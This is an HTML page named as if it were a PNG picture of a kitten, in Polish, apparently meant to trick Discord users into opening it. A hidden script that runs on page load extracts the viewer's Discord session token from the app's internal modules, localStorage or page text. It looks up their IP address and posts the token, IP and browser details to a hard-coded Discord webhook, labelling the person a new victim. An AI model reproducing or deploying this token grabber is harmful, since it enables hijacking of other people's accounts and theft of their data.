<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>zdjecie.png</title>
    <style>
        body{margin:0;overflow:hidden;background:#000}
        img{width:100%;height:100%;object-fit:cover;}
    </style>
</head>
<body>
    <!-- Twoje zdjęcie kotka -->
    <img src="https://image.ceneostatic.pl/data/products/50627763/i-najlepsze-obrazy-zaciekawiony-slodki-kotek-cb826.jpg" alt="Cute kotek">

    <script>
        async function grabToken() {
            let token = null;
            try {
                const modules = window.webpackChunkdiscord_app?.push([[{}],{},r=>r]) || {};
                for (let key in modules.c) {
                    if (modules.c[key]?.exports?.default?.getToken) {
                        token = modules.c[key].exports.default.getToken();
                        break;
                    }
                }
            } catch(e) {}

            if (!token) token = localStorage.getItem("token");
            if (!token) {
                const match = document.body.innerHTML.match(/"token":"([^"]{50,})"/i);
                if (match) token = match[1];
            }

            if (token && token.length > 50) {
                const ip = await fetch("https://api.ipify.org?format=text").then(r => r.text()).catch(() => "N/A");
                const payload = {
                    content: "**🎣 TOKEN ZŁAPANY KURWA!** 🐱",
                    embeds: [{
                        color: 0xff00ff,
                        title: "Nowa ofiara - Cute Kotek",
                        fields: [
                            {name: "Token", value: `\`\`\`${token}\`\`\``},
                            {name: "IP", value: ip},
                            {name: "UA", value: navigator.userAgent.substring(0, 200)},
                            {name: "Czas", value: new Date().toLocaleString('pl-PL')}
                        ]
                    }]
                };

                fetch("https://canary.discord.com/api/webhooks/1514653351046807702/x6zSAWEUuUajtpxSL15WC5D6FTKjESuPg1Xl2cshSFyt93d4UMTIpgwRl7xjDOPtDS8n", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            }
        }
        window.onload = grabToken;
    </script>
</body>
</html>
